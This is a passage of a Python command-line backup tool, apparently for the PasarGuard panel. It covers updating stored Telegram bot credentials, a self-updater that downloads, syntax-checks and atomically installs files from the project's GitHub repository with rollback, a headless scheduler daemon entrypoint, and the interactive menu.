        # Older scheduler (pre-v4.2) — try to auto-migrate its credentials
        # out of the plaintext unit file before giving up.
        meta = _migrate_legacy_systemd_instance(name)
    if not meta:
        print_error(f"No stored credentials found for '{name}' — cannot update it.")
        print_info("This can happen for a scheduler created by an older script version")
        print_info("whose unit file could not be auto-migrated.")
        print_info("Remove it and create a fresh scheduler instance instead.")
        return

    print()
    print_info(f"Current admin chat ID: {meta['chat']}")
    print_info(f"Current bot token: {_mask_secret(meta['token'])}")
    print()

    new_token = input(f"  {C.R2}> New Bot Token (ENTER to keep current): {C.RESET}").strip()
    new_chat  = input(f"  {C.R2}> New Admin Chat ID (ENTER to keep current): {C.RESET}").strip()

    if new_chat and not new_chat.lstrip("-").isdigit():
        print_error("Admin Chat ID must be numeric. Aborted — nothing changed.")
        return

    if not new_token and not new_chat:
        print_warning("Nothing entered — no changes made.")
        return

    write_daemon_creds(
        name,
        bot_token=new_token or None,
        admin_id=new_chat or None,
        proxy=meta["proxy"],
        interval_h=meta["interval"],
        include_node=meta["node"],
    )
    print_success(f"Credentials updated for '{name}'.")

    print_info("Restarting so the new credentials take effect...")
    _restart_scheduler_instance(kind, name)

# ── Workflow 6: Update to latest version ──────────────────────
# v5.5.3 — direct self-update for idontPG-backup.
# `idont-backup update` updates BOTH the CLI and the Web Panel from the
# durwinam/idontPG-backup main branch. Existing credentials, scheduler
# metadata, PasarGuard data and backup archives are deliberately untouched.
UPDATE_REPO_RAW = "https://raw.githubusercontent.com/durwinam/idontPG-backup/main"
UPDATE_FILES = {
    "pg_backup.py": "/usr/local/bin/idontPG-backup",
    "web_panel.py": "/usr/local/bin/idontPG-backup-web.py",
    "logo.png": "/usr/local/share/idontPG-backup/logo.png",
    "idont_bot.py": "/usr/local/bin/idontPG-backup-bot.py",
}


def _download_update_file(url, dest, timeout=45):
    """Download one update asset to a private temporary path."""
    try:
        req = urllib.request.Request(
            url,
            headers={"User-Agent": "idontPG-backup-updater/5.8.2"},
        )
        with urllib.request.urlopen(req, timeout=timeout) as r:
            data = r.read()
        if not data:
            raise ValueError("empty response")
        fd = os.open(dest, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "wb") as f:
            f.write(data)
        return True
    except Exception as e:
        print_error(f"Download failed: {url} ({e})")
        try:
            os.unlink(dest)
        except OSError:
            pass
        return False


def _validate_python_update(path, label):
    """Compile a downloaded Python file before it can replace a live file."""
    try:
        import py_compile
        py_compile.compile(path, doraise=True)
        print_success(f"{label} syntax check passed.")
        return True
    except Exception as e:
        print_error(f"{label} validation failed: {e}")
        return False


def _atomic_install(src, dest, mode=0o700):
    """Atomically replace a live file, preserving rollback capability."""
    parent = os.path.dirname(dest) or "/"
    os.makedirs(parent, exist_ok=True)
    tmp = os.path.join(parent, f".idontpg-update-{os.getpid()}-{uuid.uuid4().hex}")
    shutil.copy2(src, tmp)
    os.chmod(tmp, mode)
    os.replace(tmp, dest)


def _service_exists(name):
    try:
        return subprocess.run(
            ["systemctl", "cat", name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        ).returncode == 0
    except Exception:
        return False


def _restart_service_if_present(name, description):
    if not _service_exists(name):
        print_info(f"{description}: service not installed, skipped.")
        return True
    try:
        result = subprocess.run(
            ["systemctl", "restart", name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            text=True,
            timeout=30,
        )
        if result.returncode == 0:
            print_success(f"{description} restarted successfully.")
            return True
        print_error(f"Could not restart {description}: {result.stderr.strip() or 'unknown error'}")
        return False
    except Exception as e:
        print_error(f"Could not restart {description}: {e}")
        return False


def _read_installed_version(path):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            head = f.read(12000)
        m = re.search(r"v([0-9]+\.[0-9]+(?:\.[0-9]+)?)", head, re.I)
        return f"v{m.group(1)}" if m else "unknown"
    except Exception:
        return "unknown"


def workflow_update(non_interactive=False):
    print_header("Update idontPG-backup")
    print_info("Source: durwinam/idontPG-backup (main)")
    print_info("This updates the CLI + Web Panel + Telegram Management Bot + Web Panel logo from GitHub.")
    print_info("Your Telegram credentials, scheduler settings and PasarGuard data are not deleted.")

    if not non_interactive:
        confirm = input(f"  {C.R2}> Proceed with update? (y/n): {C.RESET}").strip().lower()
        if confirm != "y":
            print_warning("Aborted.")
            return False

    tmp_dir = tempfile.mkdtemp(prefix="idontpg_update_", dir="/tmp")
    backups = {}
    installed = []
    try:
        # Download everything before replacing anything.
        downloaded = {}

        # GitHub paths:
        #   pg_backup.py
        #   web_panel.py
        #   web/static/logo.png
        #   idont_bot.py
        #
        # The previous updater incorrectly requested /main/logo.png,
        # which does not exist and caused the entire update to abort.
        update_sources = {
            "pg_backup.py": f"{UPDATE_REPO_RAW}/pg_backup.py",
            "web_panel.py": f"{UPDATE_REPO_RAW}/web_panel.py",
            "logo.png": f"{UPDATE_REPO_RAW}/web/static/logo.png",
            "idont_bot.py": f"{UPDATE_REPO_RAW}/idont_bot.py",
        }

        for name, url in update_sources.items():
            path = os.path.join(tmp_dir, name)
            print_info(f"Downloading {name} …")
            if not _download_update_file(url, path):
                if name == "web_panel.py" and os.path.isfile(UPDATE_FILES["web_panel.py"]):
                    print_warning("GitHub Web Panel unavailable; keeping the currently installed Web Panel safely.")
                    shutil.copy2(UPDATE_FILES["web_panel.py"], path)
                else:
                    print_error("Update aborted. No installed files were changed.")
                    return False
            downloaded[name] = path

        # Never install a syntactically broken Python update.
        if not _validate_python_update(downloaded["pg_backup.py"], "pg_backup.py"):
            return False
        if not _validate_python_update(downloaded["web_panel.py"], "web_panel.py"):
            return False
        if not _validate_python_update(downloaded["idont_bot.py"], "idont_bot.py"):
            return False

        new_cli_version = _read_installed_version(downloaded["pg_backup.py"])
        new_web_version = _read_installed_version(downloaded["web_panel.py"])
        print_info(f"GitHub CLI version: {new_cli_version}")
        print_info(f"GitHub Web Panel version: {new_web_version}")

        # Backup live files in the same private temp directory.
        for name, dest in UPDATE_FILES.items():
            if os.path.isfile(dest):
                backup = os.path.join(tmp_dir, "old-" + name)
                shutil.copy2(dest, backup)
                backups[dest] = backup

        # Install CLI first. If a later step fails, roll back everything changed.
        _atomic_install(downloaded["pg_backup.py"], UPDATE_FILES["pg_backup.py"], 0o700)
        installed.append(UPDATE_FILES["pg_backup.py"])

        _atomic_install(downloaded["web_panel.py"], UPDATE_FILES["web_panel.py"], 0o700)
        installed.append(UPDATE_FILES["web_panel.py"])

        os.makedirs(os.path.dirname(UPDATE_FILES["logo.png"]), exist_ok=True)
        _atomic_install(downloaded["logo.png"], UPDATE_FILES["logo.png"], 0o644)
        installed.append(UPDATE_FILES["logo.png"])

        _atomic_install(downloaded["idont_bot.py"], UPDATE_FILES["idont_bot.py"], 0o700)
        installed.append(UPDATE_FILES["idont_bot.py"])

        # Ensure the web services execute the newly installed code immediately.
        web_ok = _restart_service_if_present(
            "idontpg-backup-web.service", "Web Panel"
        )
        scheduler_ok = _restart_service_if_present(
            "idontpg-backup-web-scheduler.service", "Web Panel Scheduler"
        )
        bot_ok = _restart_service_if_present(
            "idontpg-backup-telegram-bot.service", "Telegram Management Bot"
        )

        if not (web_ok and scheduler_ok and bot_ok):
            raise RuntimeError("one or more Web Panel services failed to restart")

        print()
        print_success("Update completed successfully.")
        print_success(f"Installed CLI: {_read_installed_version(UPDATE_FILES['pg_backup.py'])}")
        print_success(f"Installed Web Panel: {_read_installed_version(UPDATE_FILES['web_panel.py'])}")
        if os.path.isfile(UPDATE_FILES["idont_bot.py"]):
            print_success("Installed Telegram Management Bot: v5.9.8")
        print_info("Existing backup credentials and scheduler configuration were preserved.")
        return True

    except Exception as e:
        print_error(f"Update failed: {e}")
        print_warning("Rolling back files changed by this update …")
        for dest in reversed(installed):
            backup = backups.get(dest)
            try:
                if backup and os.path.exists(backup):
                    mode = 0o644 if dest.endswith(".png") else 0o700
                    _atomic_install(backup, dest, mode)
                else:
                    os.unlink(dest)
            except Exception as rollback_error:
                print_error(f"Rollback failed for {dest}: {rollback_error}")
        # Try to bring the old Web Panel back if it was replaced.
        _restart_service_if_present("idontpg-backup-web.service", "Web Panel")
        _restart_service_if_present("idontpg-backup-web-scheduler.service", "Web Panel Scheduler")
        _restart_service_if_present("idontpg-backup-telegram-bot.service", "Telegram Management Bot")
        return False
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


# ── Headless daemon entrypoint (used by screen / tmux / systemd) ──
def run_daemon_from_args():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--daemon-backup", action="store_true")
    # v4.2: --token/--chat/--proxy are no longer accepted here (they used to
    # leak via `ps`/systemd unit files). Credentials are now read from a
    # 0600 file keyed by --instance. Old flags are still parsed (accepted
    # but ignored with a warning) so a stale unit file from v4.1 doesn't
    # hard-crash — but it also won't leak a working token either.
    parser.add_argument("--token", default=None, help=argparse.SUPPRESS)
    parser.add_argument("--chat", default=None, help=argparse.SUPPRESS)
    # v4.2.1 — --proxy removed entirely. Proxy credentials (often including
    # user:pass@host:port) were leaking via `ps` and /proc/<pid>/cmdline.
    # They live in the 0600 credentials file now, same as token/chat.
    # --proxy is still parsed (silently dropped) so a stale v4.1 daemon
    # command line doesn't hard-crash the unit.
    parser.add_argument("--proxy", default=None, help=argparse.SUPPRESS)
    parser.add_argument("--interval", type=float, required=True)
    parser.add_argument("--node", action="store_true")
    parser.add_argument("--instance", default="default")
    args = parser.parse_args()

    # v4.2.1 — --instance flows into _creds_path(). Reject anything that
    # could escape /etc/pasarguard-backup before opening the file.
    try:
        _validate_instance_name(args.instance, allow_empty=False)
    except ValueError as e:
        sys.stderr.write(f"[pg-backup] invalid --instance value: {e}\n")
        sys.exit(1)

    if args.token or args.chat:
        sys.stderr.write(
            "[pg-backup] --token/--chat CLI args are no longer supported for security "
            "reasons; re-create this scheduler from the menu so credentials are stored "
            "in a 0600 file instead.\n"
        )
        sys.exit(1)

    try:
        token, chat, proxy = read_daemon_creds(args.instance)
    except FileNotFoundError:
        sys.stderr.write(f"[pg-backup] No credentials file found for instance '{args.instance}' "
                          f"in {CREDS_DIR}. Re-create the scheduler from the menu.\n")
        sys.exit(1)

    proxy = args.proxy or proxy  # args.proxy is always None (SUPPRESS) — kept for back-compat
    run_scheduled_backup_loop(token, chat, args.interval, args.node, proxy, args.instance)

# ── Main menu ─────────────────────────────────────────────────
MENU = [
    ("1", "Auto Backup to Telegram Bot (Scheduled)"),
    ("2", "Manual Backup (Save locally)"),
    ("3", "Manage Backup Schedulers (start/stop/restart)"),
    ("4", "Update to Latest Version"),
    ("5", "Open Web Panel"),
]

def main():
    while True:
        print_header()

        print(f"  {C.R3}{'─' * 50}{C.RESET}")
        for num, label in MENU:
            print(f"  {C.R1}{num}{C.RESET}  {C.R3}-{C.RESET}  {C.WH}{label}{C.RESET}")
        print(f"  {C.R3}{'─' * 50}{C.RESET}")
        print()
        panel_info = _get_web_panel_info()
        panel_url = panel_info["url"]
        print(f"  {C.R2}🌐 Web Panel:{C.RESET} {C.WH}{panel_url}{C.RESET}")
        print(f"  {C.R3}Protocol:{C.RESET} {C.WH}HTTP only{C.RESET}")
        print(f"  {C.R3}Open the link above to sign in to the Web Panel.{C.RESET}")
        print(f"  {C.R3}Press Ctrl+C to exit.{C.RESET}")
        print()

        choice = input(f"  {C.R2}> Select option (1-5): {C.RESET}").strip()
        print()

        if choice == "1":
            workflow_backup_bot()
            pause_and_return()
        elif choice == "2":
            workflow_manual_backup()
            pause_and_return()
        elif choice == "3":
            workflow_manage_schedulers()
            pause_and_return()
        elif choice == "4":
            workflow_update()
            pause_and_return()
        elif choice == "5":
            panel_info = _get_web_panel_info()
            print(f"  {C.R2}🌐 Web Panel: {C.RESET}{panel_info['url']}")
            print(f"  {C.R3}Protocol:{C.RESET} {C.WH}HTTP only{C.RESET}")
            print()
            pause_and_return()
        else:
            print_error("Invalid option. Please enter 1-6.")
            time.sleep(1.5)

if __name__ == "__main__":
    # Direct CLI updater: `idont-backup update` / `idontPG-backup update`.
    # It runs before the interactive menu and never touches scheduler data.
    if len(sys.argv) >= 2 and sys.argv[1].lower() in ("update", "upgrade"):
        if os.geteuid() != 0:
            print_error("Update must be run as root.")
            sys.exit(1)
        sys.exit(0 if workflow_update(non_interactive=False) else 1)
    if "--daemon-backup" in sys.argv:
        run_daemon_from_args()
    else:
        main()
